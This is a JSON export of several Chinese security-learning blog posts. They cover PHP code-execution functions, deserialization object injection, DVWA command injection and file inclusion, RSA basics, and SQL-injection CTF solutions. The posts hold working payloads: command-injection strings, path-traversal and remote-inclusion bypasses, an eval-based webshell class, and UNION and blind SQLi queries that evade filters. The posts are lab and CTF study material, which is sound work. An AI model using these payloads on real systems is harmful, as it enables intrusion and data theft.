mixed $assertion [, Throwable $exception ] ) : bool assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。 判断一个表达式是否成立。返回true or false。 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 一般情况下，黑名单都会禁用eval()函数，所以用assert来代替eval来执行具体操作。 例如：1assert(\"phpinfo()\") &lt;=&gt; &lt;?phpinfo()?&gt; 与eval函数的区别： 1assert()把整个字符串参数当php代码执行，eval()把合法的php代码执行。 preg_replace()函数定义和用法： preg_replace 函数执行一个正则表达式的搜索和替换。 preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed 正常来说preg_replace()函数是用于正则表达式的，但preg_replace 函数也可能会导致命令执行。 如果subject 中有 pattern 的匹配则preg_replace 的 /e 修正符会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行。 通过一个简单的例子来看一下该函数的用法： 输入payload： 123?pat=/test/e&amp;rep=phpinfo()&amp;sub=jutst test也可以为?pat=/test/e&amp;rep=var_dump(`net user`)&amp;sub=jutst test create_function()函数定义和用法： string create_function ( string $args , string $code )函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称 下面通过一个例子来了解一下这个函数 123456789&lt;?phperror_reporting(0);$sort_by = $_GET['sort_by'];$sorter = 'strnatcasecmp';$databases=array('1234','4321');$sort_function = ' return 1 * ' . $sorter . '($a[\"' . $sort_by . '\"], $b[\"' . $sort_by . '\"]);';usort($databases, create_function('$a, $b', $sort_function));?&gt;#usort() 使用用户自定义的比较函数对数组进行排序 首先构造出匿名函数的原型： 1234function test($a,$b)&#123;return 1 * ' . $sorter . '($a[\"' . $sort_by . '\"], $b[\"' . $sort_by . '\"]);&#125; 构造payload：1http://localhost/test/1.php?sort_by='\"]);&#125;phpinfo();/* 传入后便可以得到： 1return 1 * strnatcasecmp($a[\"\"]);&#125;phpinfo();/*\"], $b[\"\"]);&#125;phpinfo();/*\"]); 可以看到构造的语句中注释符/*将后面&quot;], $b[&quot;&quot;]);}phpinfo();/*&quot;]);这一段给注释掉了 此时匿名函数就变成了 12345function test($a,$b)&#123;return 1 * strnatcasecmp($a[\"\"]);&#125;phpinfo(); 因此可以注入成功 call_user_func函数定义和用法： mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 通过一个例子来了解一下这个函数： 12345&lt;?php $filter= 'assert'; $value = 'phpinfo()'; call_user_func($filter, $value); ?&gt; 这里$filter作为回调函数进行调用，phpinfo()则是是回调函数的参数，所以可以执行命令 二、命令执行函数exec()函数定义和用法： exec — 执行一个外部程序 shell_exec()函数定义和用法： 通过 Shell 执行命令，并将执行结果作为字符串返回。 passthru()函数定义和用法： 允许执行一个外部程序并回显输出，类似于 exec()。 escapeshellcmd()函数定义和用法： escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 escapeshellcmd ( string $command ) : string 在DVWA中练习命令注入就会了解以上函数，这里就不再举例。DVWA_命令注入 三、包含函数 require()include()require_once()include_once() 这些包含函数在之前的博客中也有过介绍，这里就不阐述了DVWA——文件包含 四、文件操作函数 copy()————————拷贝文件file_get_contents()———将整个文件读入一个字符串file_put_contents()———将一个字符串写入文件file()—————————-把整个文件读入一个数组中fopen()————————打开文件或者urlmove_uploaded_file()—-将上传的文件移动到新位置readfile()———————-输出文件rename()———————重命名一个文件或目录rmdir()————————删除目录unlink &amp; delete()———–删除文件 读取：可以读取配置等文件写入：可以写入shell代码相关的内容 总结：这次了解了PHP常用的一些危险函数，下次就通过做题将这些函数用于实践。 参考博客：常见危险函数及特殊函数PHP代码命令注入小结","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://bealright.github.io/tags/PHP/"}]},{"title":"PHP反序列化漏洞学习(一)","slug":"PHP反序列化漏洞学习(一)","date":"2019-08-12T08:38:24.000Z","updated":"2019-08-15T09:45:24.505Z","comments":true,"path":"2019/08/12/PHP反序列化漏洞学习(一)/","link":"","permalink":"http://bealright.github.io/2019/08/12/PHP反序列化漏洞学习(一)/","excerpt":"","text":"前言：PHP反序列化也是web安全中常见的一种漏洞，这次就先来大致了解一下PHP反序列化漏洞的基础知识。 一、PHP序列化和反序列化在学习PHP反序列化漏洞时，先来了解一下基础的知识。 (一)PHP序列化函数 : serialize() 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 一开始看这个概念可能有些懵，看了很多大师傅们的博客后，慢慢明白这个概念的道理。 在程序执行结束时，内存数据便会立即销毁，变量所储存的数据便是内存数据，而文件、数据库是“持久数据”，因此PHP序列化就是将内存的变量数据“保存”到文件中的持久数据的过程。 12$s = serialize($变量); //该函数将变量数据进行序列化转换为字符串file_put_contents(‘./目标文本文件’, $s); //将$s保存到指定文件 下面通过一个具体的例子来了解一下序列化：输出序列化后的结果：12User lemon is 20 years old. O:4:\"User\":2:&#123;s:3:\"age\";i:20;s:4:\"name\";s:5:\"lemon\";&#125; 可以看到序列化一个对象后将会保存对象的所有变量，并且发现序列化后的结果都有一个字符，这些字符都是以下字母的缩写。123456a - array b - boolean d - double i - integero - common object r - references - string C - custom objectO - class N - nullR - pointer reference U - unicode string 了解了缩写的类型字母，便可以得到PHP序列化格式12O:4:\"User\":2:&#123;s:3:\"age\";i:20;s:4:\"name\";s:5:\"lemon\";&#125;对象类型:长度:\"类名\":类中变量的个数:&#123;类型:长度:\"值\";类型:长度:\"值\";......&#125; 通过以上例子，便可以理解了概念中的通过serialize()函数返回一个包含字节流的字符串这一段话。 (二)PHP反序列化函数：unserialize() unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 在解序列化一个对象前，这个对象的类必须在解序列化之前定义。 简单来理解起来就算将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程，恢复到变量序列化之前的结果。 12$s = file_get_contents(‘./目标文本文件’); //取得文本文件的内容（之前序列化过的字符串）$变量 = unserialize($s); //将该文本内容，反序列化到指定的变量中 通过一个例子来了解反序列化：输出结果： 1User lemon is 20 years old. 注意：在解序列化一个对象前，这个对象的类必须在解序列化之前定义。否则会报错 在先知上看大师傅举得例子对序列化和反序列化的介绍，也很好理解。1234567891011121314&lt;?phpclass A&#123; var $test = \"demo\";&#125;$a = new A(); // 生成a对象$b = serialize($a); // 序列化a对象为b$c = unserialize($b); // 反序列化b对象为cprint_r($b); // 输出序列化之后的值:O:1:\"A\":1:&#123;s:4:\"test\";s:4:\"demo\";&#125;echo \"\\n\";print_r($c-&gt;test); // 输出对象c中test的值:demo?&gt; 二、PHP反序列化漏洞 在学习漏洞前，先来了解一下PHP魔法函数，对接下来的学习会很有帮助 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法 1234567891011121314__construct 当一个对象创建时被调用，__destruct 当一个对象销毁时被调用，__toString 当一个对象被当作一个字符串被调用。__wakeup() 使用unserialize时触发__sleep() 使用serialize时触发__destruct() 对象被销毁时触发__call() 在对象上下文中调用不可访问的方法时触发__callStatic() 在静态上下文中调用不可访问的方法时触发__get() 用于从不可访问的属性读取数据__set() 用于将数据写入不可访问的属性__isset() 在不可访问的属性上调用isset()或empty()触发__unset() 在不可访问的属性上使用unset()时触发__toString() 把类当作字符串使用时触发,返回值需要为字符串__invoke() 当脚本尝试将对象调用为函数时触发 这里只列出了一部分的魔法函数，具体可见PHP 手册 下面通过一个例子来了解一下魔法函数被自动调用的过程 1234567891011121314151617181920212223242526272829303132&lt;?phpclass test&#123; public $varr1=\"abc\"; public $varr2=\"123\"; public function echoP()&#123; echo $this-&gt;varr1.\"&lt;br&gt;\"; &#125; public function __construct()&#123; echo \"__construct&lt;br&gt;\"; &#125; public function __destruct()&#123; echo \"__destruct&lt;br&gt;\"; &#125; public function __toString()&#123; return \"__toString&lt;br&gt;\"; &#125; public function __sleep()&#123; echo \"__sleep&lt;br&gt;\"; return array('varr1','varr2'); &#125; public function __wakeup()&#123; echo \"__wakeup&lt;br&gt;\"; &#125;&#125;$obj = new test(); //实例化对象，调用__construct()方法，输出__construct$obj-&gt;echoP(); //调用echoP()方法，输出\"abc\"echo $obj; //obj对象被当做字符串输出，调用__toString()方法，输出__toString$s =serialize($obj); //obj对象被序列化，调用__sleep()方法，输出__sleepecho unserialize($s); //$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。// 脚本结束又会调用__destruct()方法，输出__destruct?&gt; 显示结果：例子载自于脚本之家，通过这个例子就可以清晰的看到魔法函数在符合相应的条件时便会被调用。 二、对象注入当用户的请求在传给反序列化函数unserialize()之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的unserialize函数，最终导致一个在该应用范围内的任意PHP对象注入。 对象漏洞出现得满足两个前提： 一、unserialize的参数可控。二、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。 12345678910&lt;?phpclass A&#123; var $test = \"demo\"; function __destruct()&#123; echo $this-&gt;test; &#125;&#125;$a = $_GET['test'];$a_unser = unserialize($a);?&gt; 比如这个列子，直接是用户生成的内容传递给unserialize()函数，那就可以构造这样的语句1?test=O:1:\"A\":1:&#123;s:4:\"test\";s:5:\"lemon\";&#125; 在脚本运行结束后便会调用_destruct函数，同时会覆盖test变量输出lemon。发现这个漏洞，便可以利用这个漏洞点控制输入变量，拼接成一个序列化对象。再看下面这个例子：123456789101112&lt;?phpclass A&#123; var $test = \"demo\"; function __destruct()&#123; @eval($this-&gt;test);//_destruct()函数中调用eval执行序列化对象中的语句 &#125;&#125;$test = $_POST['test'];$len = strlen($test)+1;$pp = \"O:1:\\\"A\\\":1:&#123;s:4:\\\"test\\\";s:\".$len.\":\\\"\".$test.\";\\\";&#125;\"; // 构造序列化对象$test_unser = unserialize($pp); // 反序列化同时触发_destruct函数?&gt; 其实仔细观察就会发现，其实我们手动构造序列化对象就是为了unserialize()函数能够触发__destruc()函数，然后执行在__destruc()函数里恶意的语句。 所以我们利用这个漏洞点便可以获取web shell了 总结：这次PHP反序列化漏洞的基础大致都了解了，但对于对象注入还是需要继续学习，这次就先学习到这里。 参考博客：PHP反序列化漏洞与Webshell实战经验丨PHP反序列化漏洞总结","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://bealright.github.io/tags/PHP/"}]},{"title":"DVWA——命令执行漏洞学习","slug":"DVWA——命令执行漏洞学习","date":"2019-08-10T12:01:24.000Z","updated":"2019-08-12T03:53:45.771Z","comments":true,"path":"2019/08/10/DVWA——命令执行漏洞学习/","link":"","permalink":"http://bealright.github.io/2019/08/10/DVWA——命令执行漏洞学习/","excerpt":"","text":"前言：命令执行和代码执行也是web安全中常见的一种漏洞，这次就先来学习一下命令执行漏洞。 Command Execution一、简介 由于开发人员在编写源代码时，没有对源代码中可执行的特殊函数入口做过滤，导致客户端可以提交一些cmd命令，并交由服务器程序执行。导致攻击者可以通过浏览器或者其他客户端软件提交一些cmd命令（或者bash命令）至服务器程序，服务器程序通过system、eval、exec等函数直接或者间接地调用cmd.exe执行攻击者提交的命令。 二、常用的连接符12345A;B 先执行A，再执行BA&amp;B 简单拼接，A B之间无制约关系A|B 显示B的执行结果A&amp;&amp;B A执行成功，然后才会执行BA||B A执行失败，然后才会执行B 三、常用的函数123456789exec() — 执行一个外部程序#exec 不会主动返回执行结果,且只是返回结果的最后一行;passthru() — 执行外部程序并且显示原始输出#passthru()用来执行外部命令,但直接将结果输出到浏览器(未经任何处理的 原始输出),没有返回值;system() — 执行外部程序，并且显示输出#system()成功则返回命令输出的最后一行，失败则返回 FALSE;shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。#当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 NULLeval()：将输入的字符串参数当做PHP程序代码来执行 具体可以参考php中文网 四、windows net命令12345678910Net ViewI作用：显示域列表、计算机列表或指定计算机的共享资源列表。Net User作用：添加或更改用户帐号或显示用户帐号信息。Net Use作用：连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息。Net Time作用：使计算机的时钟与另一台计算机或域的时间同步。Net Config作用：显示当前运行的可配置服务，或显示并更改某项服务的设置。 具体可以参考大师傅的博客CMD-NET命令详解这个漏洞是真的恐怖，可以任意修改你的计算机里的内容。 在了解了基础的知识后，下面就通过DVWA来练习一下Command Execution. DVWA——Command Injection在此之前先来解决乱码的问题 在DVWA\\dvwa\\includes目录下找到dvwaPage.inc.php文件中所有的”charset=utf-8”，修改”charset=gb2312”，即可解决乱码问题。 low观察源码123456789stristr() 函数搜索字符串在另一字符串中的第一次出现，不区分大小写php_uname() 返回了运行 PHP 的操作系统的描述。参数：'a'：此为默认。's'：操作系统名称。'n'：主机名。'r'：版本名称。'v'：版本信息。'm'：机器类型。 通过源码可以看出，源码只是针对不同的操作系统执行不同的ping命令而已，没有对ip参数并未做任何的过滤，因此存在命令注入漏洞。 输入 1127.0.0.1&amp;&amp;echo &quot;Hello&quot; 回显结果执行了我输入的echo &quot;Hello&quot;命令 接下来输入 1127.0.0.1&amp;&amp;net user 命令执行成功，但这个漏洞是真的恐怖，如果攻击者利用这个漏洞修改电脑用户、更改系统配置。。。，可见危害之大。 medium观察源码发现这段代码 12$target = str_replace( array_keys( $substitutions ), $substitutions, $target ); #array_keys() 函数返回包含数组中所有键名的一个新数组。 过滤了&amp;&amp;、；，但是没有过滤掉&amp;、|,所以依旧有漏洞存在 输入 1127.0.0.1 | net user 也可以输入1127.0.0.1&amp; net user 一样会执行成功 除此之外，也可以采用拼接的方法进行绕过 1127.0.0.1&amp;;&amp;net user High 观察源码 这次过滤的更狠，几乎过滤了所有的常用连接符，拼接的方法也是不起作用的，但是观察代码发现 |+空格多出一个空格，所以不会过滤|那就利用这个漏洞进行命令执行 输入 1127.0.0.1 |net user impossible 观察源码 123456stripslashes(string)#stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。explode(separator,string,limit)#explode()函数把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目is_numeric(string)#is_numeric()函数检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。 Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。 总结：通过这次学校了解了命令执行漏洞的一些知识，确实很有意思，接下来学习代码执行漏洞。 参考博客：Command Injection Web安全 - 命令执行漏洞命令执行漏洞简介","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"http://bealright.github.io/tags/命令执行/"}]},{"title":"文件包含漏洞——DVWA练习","slug":"文件包含漏洞——DVWA练习","date":"2019-08-09T12:01:24.000Z","updated":"2019-08-11T08:46:57.753Z","comments":true,"path":"2019/08/09/文件包含漏洞——DVWA练习/","link":"","permalink":"http://bealright.github.io/2019/08/09/文件包含漏洞——DVWA练习/","excerpt":"","text":"前言：在学习文件上传时，制作的图片马需要我们手动去解析，而解析的方法就算用到了文件包含漏洞，所以这次就来学习一下文件包含漏洞。 文件包含漏洞简介 （一）文件包含可以分为本地文件包含和远程文件包含两种。文件包含和文件上传一样本身并不是漏洞，而是攻击者利用了包含的特性加上了应用本身对文件控制不严格，对include进来的文件不可控，才导致了一系列危害。（二）本地文件包含就是通过URL将服务器本地的其他文件include进来。远程文件包含就是将远程服务器的文件include进来。（三）最主要的是，包含进来的文件都以当前脚本文件解析，例如，当前测试系统是Apache加php环境，那么被include进来的文件，不管是什么类型，例如图片，文本文档等，这些文件被包含以后，都会被当做php脚本来解析。 本地文件包含 通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格 的过滤允许遍历目录的字符注入浏览器并执行。总的来说就是被包含的文件在服务器本地 远程文件包含 在远程服务器上预先设置好的脚本，然后攻击者利用该漏洞包含一个远程的文件，这种漏洞的出现是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码简单的说就是被包含的文件在第三方服务器 文件包含常用函数以php为例，常用的文件包含函数有：123456789Include()#当包含并运行指定文件时，包含的外部文件发生错误，系统会给出警告，但整个php文件还会继续执行。Require()/*require()与 include()的区别在于 require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。*/include_once()/*和include没有什么区别，只是在导入函数之前先检测下该文件是否被include过，如果已经执行了一遍，那么就不在进行第二次的include操作。*/require_once()#功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次 DVWA练习了解了一些文件包含漏洞的简介和常用函数，下面就通过万能的DVWA来进行文件包含漏洞的练习 12注意:使用远程包含需要开启allow_url_include 在此之前，先来了解一下./和../以及/ 12345/ 根目录./ 是当前目录../ 返回到上一级目录../../ 返回了两级目录.\\ 、..\\和./、../意义相同 low观察源码发现直接是get方法进去，没有任何过滤，那么就来执行文件包含漏洞输入 1?page=../../phpinfo.php 发现本地文件包含成功 远程文件包含这里就先在自己的服务器根目录（WWW目录下）下创建一个文件然后通过远程文件包含来执行输入1?page=http://127.0.0.1/file.txt 发现远程包含成功这里也可以用虚拟机和主机来进行远程文件包含漏洞的测试，不过这里就以本地的服务器来进行测试。 medium 1str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写） 发现medium已经过滤了http://、../等，那么就来构造这样的方法来进行绕过1?page=..././..././phpinfo.php 源码中过滤了../，所以我们输入的经过过滤后变成 1?page=../../phpinfo.php 这样依旧是没有过滤掉../，通过错位进行拼接成../ 其实感觉绕过方法大多都是互通的，这种绕过在SQL注入、XSS攻击等都是出现过的本地文件包含成功，接下来来尝试远程文件包含 源码中是过滤了http://、https://,可以尝试大小写进行绕过，也可以通过双写进行绕过例如：httphttp://:// 1?page=Http://127.0.0.1/file.txt 即可绕过 High 1fnmatch() 函数根据指定的模式来匹配文件名或字符串。 源码中限制了文件名来防止恶意文件包含，并且!fnmatch( &quot;file*&quot;, $file )代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。所以就用到了file协议，就来了解一下file协议。 file协议 1本地文件传输协议 ,file协议主要用于访问本地计算机中的文件. file协议的基本格式 1234file:///文件路径如打开D盘www文件下的PHPinfo文件file:///D:/www/phpinfo注意:后面必须是绝对路径： 了解了file协议，就构造相应的语句即可进行文件包含 1?page=file:///D:/phpstuy/www/file.txt impossible分析一下源码 发现if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; )这一句代码已经将page的参数限制成固定的值了，所以没有办法进行文件包含。 总结：这次算是大致了解了一些文件包含漏洞的知识，但是文件包含还有很多绕过姿势，接下来继续学习！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"http://bealright.github.io/tags/文件包含/"}]},{"title":"密码学——RSA加密算法原理","slug":"密码学——RSA加密算法原理","date":"2019-08-07T12:34:24.000Z","updated":"2019-08-09T07:26:57.294Z","comments":true,"path":"2019/08/07/密码学——RSA加密算法原理/","link":"","permalink":"http://bealright.github.io/2019/08/07/密码学——RSA加密算法原理/","excerpt":"","text":"前言：之前在做密码学题的时候了解了一下RSA，但总感觉那时总结的过少，而且也理解的不到位，这次就再来详细的了解一下，并通过做题来巩固一下。 一、对称加密与非对称加密对称加密： 加密和解密用的是同一密钥，也是最简单、最快速的加密方式，通常使用的密匙相对较小，容易被破解，如果密钥过大，安全性确实可以得到保证，但同样加密和解密的效率将会很低。 因为双方都需要密钥进行加密解密，如果有一方的密钥泄露出去，整个安全性将不复存在，所以这也是对称加密的缺点。 非对称加密： 相较于对称加密，非对称加密使用两个密匙，即公开密钥和私钥密钥。非对称加密很有趣，公钥是任何人都可以请求得到的，但私钥只有一个人持有，而且用公钥加密的密文只能通过私钥来解开，解密者无需像对称加密一样接收加密者的密钥，而是自己保存一个密钥，这样就不在网上传送密匙，不会被拦截，会更加安全，但是相对于对称加密，非对称加密加密和解密的效率会低一些 下面就来学习属于非对称加密中的RSA算法 RSA概述： 1977年，三位数学家Rivest、Shamir 和 Adleman 设计出RSA算法，可以实现非对称加密。而在此之前，使用的都是对称加密。 RSA算法涉及的数学知识 了解RSA之前，需要了解一些数学知识 一、互质关系 两个正整数，除1以外，没有其他公因子，那么这两个数就是互质关系。 例如：30与7就是互质关系，但是30不是质数，这就是说明不是质数也能构成互质关系 由互质关系能得出以下结论： 任意两个质数构成互质关系，比如7和61。 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。 1和任意一个自然数是都是互质关系，比如1和99。 p是大于1的整数，则p和p-1构成互质关系，比如57和56。 p是大于1的奇数，则p和p-2构成互质关系，比如17和15。 二、欧拉函数 在数论，对正整数n，欧拉函数是小于n的正整数中与n互质的数的数目，以φ(n)表示 其实欧拉函数就是用来计算这样一个问题 任意给定正整数n，在小于等于n的正整数之中，有多少个与n构成互质关系？ 举个列子： 在1—10中，与10互质的有1、3、7、9，即φ(n)=4 通过欧拉函数又衍生出几种情况： 第一种情况： 如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。第二种情况： 如果n是质数，则φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如7与1、2、3、4、5、6都构成互质关系。 其中对RSA最重要的一种情况就是： 如果n可以分解成两个互质的整数之积 1n = p1 × p2 则 1φ(n) = φ(p1p2) = φ(p1)φ(p2) 通过这个公式可以看出积的欧拉函数等于各个因子的欧拉函数之积 举个列子： 123n=21n=3*7φ(n) = φ(p1p2) = φ(3)φ(7)=2*6=12 三、欧拉定理 欧拉定理表明，若n,a为正整数，且n,a互质，则以下公式成立： 换句话就是a的φ(n)次方被n除的余数为1或者是a的φ(n)次方减去1，可以被n整除。 举个列子： 例如：2和5互质，φ(5)=4，则2的4次方(16)减1,15恰好被n(5)整除 欧拉定理还有一个特殊情况： 如果正整数a与质数p互质，因为质数p的φ(p)等于p-1，则欧拉定理可以写成： 四、模反元素 如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。这时，b就叫做a的“模反元素”。 举个列子： 1234a=3,n=4(3*b-1)%4=0故b=7或b=3显然模反元素不止一个，即如果b是a的模反元素，则 b+kn 都是a的模反元素（k为正整数） 可以看出，a的 φ(n)-1 次方，就是a对模数n的模反元素 五、模运算 让m去被n整除，只取所得的余数作为结果，就叫做模运算。 举个例子： 110 mod 4=2、8 mod 3=2 六、同余 给定一个正整数m，如果两个整数a和b满足a-b能被m整除，即(a-b) mod m=0，那么就称整数a与b对模m同余，记作a≡b (mod m)，同时可成立a mod m=b 而且同余与模运算是不同的 a≡b (mod m)仅可推出b=a mod m 七、欧几里德算法 欧几里德算法是用来求两个正整数最大公约数的算法计算公式gcd(a,b) = gcd(b,a mod b) 计算方法： 用较大数除以较小数，再用出现的余数（第一余数）去除除数，再用出现的余数（第二余数）去除第一余数，如此反复，直到最后余数是0为止 计算流程图为：需要的数学知识已经了解完了，接下来就来学习RSA RSA算法 （一）、生成密钥过程：一、随机选择两个不相等的质数p和q 二、计算p和q的乘积n 三、计算n的欧拉函数φ(n) 四、随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质 五、计算e对于φ(n)的模反元素d 六、将n和e封装成公钥，n和d封装成私钥 下面就通过一个列子来执行一遍 12345678910111213141516一、选取两个不相等的质数p=11 q=13二、n=p*q=143三、φ(n)=(p-1)(q-1)=10*12=120四、从1&lt;e&lt;60, 随机选取一个e,这里选取7五、根据欧拉定理 e*d ≡ 1 (mod φ(n))，该公式又可转化为e*d - 1 = kφ(n)所以7*d+120*k=1,这个方程可以由扩展欧几里得算法（辗转相除法）来得出结果：六、120 = 7 * 17 + 1 17 = 17 * 1 //余数放前面 1 = 120 * 1 + 7 * (-17) 1 = 120 * 1 + 7 *(-17) 故d = -17 k = 1 在RSA中d必须是正整数，所以将它翻转 d=120 + （-17）=103 故公钥为（n,e）=(143,7) 私钥为（n,d）=(143,103) （二）、加密解密过程求出公钥和私钥，就可以对信息进行加密和解密 一、通过公钥进行加密（n,e） 设明文为M，密文为C，则加密公式为：假设明文为13，则 12M^e ≡ c (mod n)13^7 = 117 (mod 143) 二、通过私钥进行解密（n,d） 密文为C，明文为M，则解密公式为： 12C^d ≡ M (mod n)117^103 = 13 (mod 143) 换句通俗的话说C的d次方除以n的余数为M (三)、RSA安全性在已知n和e的情况下即（公钥），能否推导出d？ 12345（1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。 （2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。 （3）n=pq。只有将n因数分解，才能算出p和q。 但现实生活中，不可能跟我们举例子一样那么小，而且大整数的因数分解，是一件非常困难的事情，例如： 12345678912301866845301177551304949 58384962720772853569595334 79219732245215172640050726 36575187452021997864693899 56474942774063845925192557 32630345373154826850791702 61221429134616704292143116 02221240479274737794080665 351419597459856902143413 没法对这个整数进行因数分解，过于大了，而且目前破解的只有暴力破解，所以RSA才号称是地球上最安全的算法。 总结：这次总结更加详细的了解了RSA的原理以及涉及的数学原理，接下来就通过做题来进行巩固。 参考博客：RSA算法基础详解RSA算法原理（二）RSA超详细讲解","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://bealright.github.io/categories/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"实验吧——SQL注入 Write up(一)","slug":"实验吧——SQL注入 Write up(一)","date":"2019-08-05T11:22:21.000Z","updated":"2019-08-07T03:31:17.934Z","comments":true,"path":"2019/08/05/实验吧——SQL注入 Write up(一)/","link":"","permalink":"http://bealright.github.io/2019/08/05/实验吧——SQL注入 Write up(一)/","excerpt":"","text":"前言：之前学习过了联合注入查询、布尔盲注、时间盲注等，这次就通过SQL注入题来加强一下。 简单的sql注入方法一输入有回显，且有输入框，那就可以用联合查询的方法来注入 题中提示已经过滤了一些关键字，那么就先来查看题中过滤的是哪些关键字 1?id=1 union select order by # 回显结果：union，select等都被过滤而且没有报错说明#也被过滤可以自己建立一个语句来验证一下如果#没有被过滤，那么上面的语句将会变成这样，语句一定会报错题中将关键字过滤，可以尝试一下双写绕过的方法是否可用输入框中输入?id=1 unionunion selectselect，发现空格也被过滤了但双写绕过的方法是可行的，可以采用这个方法 判断注入点可以采用&#39;=&#39;或1&#39; or &#39;1&#39;=&#39;1查看是否有注入点SQL注入——注入点判断 判断闭合符号 发现输入框中输入1&#39;时语句报错，由于这道题将注释符号给过滤了，那就用&#39;来闭合后面的单引号，这样来测试是否&#39;为闭合符号，可以自己建立sql语句来更详细的了解一下在输入框中输入1 &#39; &#39;,发现回显正常，说明&#39;即为闭合符号接下来就是联合注入的一系列步骤了 判断列数 当判断是否有注入点的时候，发现只有name，而我们输入的ID则一直不变，因此猜测列数只有一列 查询数据表 题中已经将注释符给过滤掉了，但是在上面已经知道了&#39;是闭合符号，那就可以用and &#39;1&#39;=&#39;1来闭合后面的单引号 1?id=1' union select group_concat(table_name) from information_schema.tables where table_schema=database() and '1'='1 其他都被过滤了，构造双写绕过，前面也说了空格也被过滤了，但是也可以用两个空格来绕过过滤 输入 1?id=1' unionunion selectselect group_concatgroup_concat(table_name) fromfrom information_schema.tables wherewhere table_schematable_schema=database() andand '1'='1 发现table_schematable_schema被强制换掉了，那么就用table_schemtable_schemaa这种形式来绕过，过滤中间的，前后再拼接成table_schematable_schema payload：1?id=1' unionunion selectselect group_concatgroup_concat(table_name) fromfrom information_schema.tables wherewhere table_schemtable_schemaa=database() andand '1'='1 有一个表名为flag，flag应该就在里面 查字段 payload：1?id=1'unionunion selectselect group_concatgroup_concat(column_namcolumn_namee) fromfrom information_schema.columinformation_schema.columnsns wherewhere table_name='flag 这里column_name也采用错位的方法来绕过，但估计是系统原因吧，莫名奇妙崩了看了其他大师傅的博客，知道flag是其中的一个字段，就构造语句查询结果 查值 payload：1?id=1'unionunion selectselect flag fromfrom flag wherewhere '1'='1 得出结果 方法二一道题肯定是不只一种解法的，再来看看另一种方法输入1?id=1 unionunion and selectselect 发现回显很奇怪，如果是过滤关键字了，为什么还有关键字，尝试几次就会发现关键字过滤实际上是过滤后面带有一个空格的关键字，那就又出现了一个思路，只需将空格绕过即可 常见的空格绕过有这些 1+、%0a、%0b、/**/ 查询数据库 1?id=1' union/**/select/**/database()' 1?id=1' union%0aselect%0adatabase()' 1?id=1' union%0bselect%0bdatabase()' 三种均能够查出数据库 查数据表 1?id=1' union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schemtable_schemaa='web1 同样table_schema需要错位来进行绕过查字段 1?id=1'union/**/select/**/group_concat(column_namcolumn_namee)/**/from/**/information_schema.information_schema.columnscolumns/**/where/**/table_name='flag 还是那个问题，不管它，反正语句正确 查值 1?id=1' union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1 简单的sql注入之2输入1?id=1' and length(database())&gt;1 --+ 回显结果为：第一反应用时间盲注试试 1?id=1' and if(length(database())&gt;5,1,sleep(5)) --+ 回显结果： 那就换一种思路，用布尔盲注测试 1?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;200 --+ 故意将ASCII值调大，看是否还出现SQLi detected! 